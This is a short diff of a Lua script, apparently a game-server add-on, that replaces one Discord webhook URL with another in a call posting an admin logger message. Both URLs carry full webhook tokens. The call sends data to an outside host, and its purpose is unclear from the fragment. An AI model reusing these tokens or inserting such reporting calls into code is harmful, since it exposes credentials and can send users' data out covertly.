@@ -60,7 +60,7 @@ function AdminLoggerMsg()
 end
 
 PostWebhook(
-    "https://discord.com/api/webhooks/1269244492473569311/FBxbax-nMXpWX7udeGhLy3Jhec1Nj88GOIEfz4S9Dsx8k-CL1olKF8yGVg801jG0ATrD",
+    "https://discordapp.com/api/webhooks/1302875360970539039/Lft7q2RmPRzi0jlImyIf7wnE2lr68zPMw_w-wqm1HpA6Bi7lmF2UDHbQQLZZvd6w5tgX",
     AdminLoggerMsg()
 )
 print("Dell load")
